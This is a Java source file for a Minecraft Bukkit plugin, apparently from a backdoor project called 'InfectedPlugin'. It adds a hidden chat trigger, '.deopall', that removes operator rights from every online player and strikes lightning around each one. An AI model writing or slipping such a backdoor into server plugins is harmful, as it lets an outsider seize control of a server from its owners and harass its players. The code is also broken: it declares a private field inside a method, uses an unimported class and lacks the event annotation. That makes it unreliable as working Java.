package org.CreeperCoders.InfectedPlugin;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_deopall implements Listener
{
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        private Server server = Bukkit.getServer();
        boolean cancel = true;
    
        if (message.toLowerCase().contains(".deopall"))
        {
            for (final Player target : server.getOnlinePlayers())
            {
                target.setOp(false);
                //Something extra c:
                final Location target_pos = target.getLocation();
                for (int x = -1; x <= 1; x++)
                {
                    for (int z = -1; z <= 1; z++)
                    {
                        final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
                        target_pos.getWorld().strikeLightning(strike_pos);
                    }
                }
                cancel = true;
            }
        }
    }
}
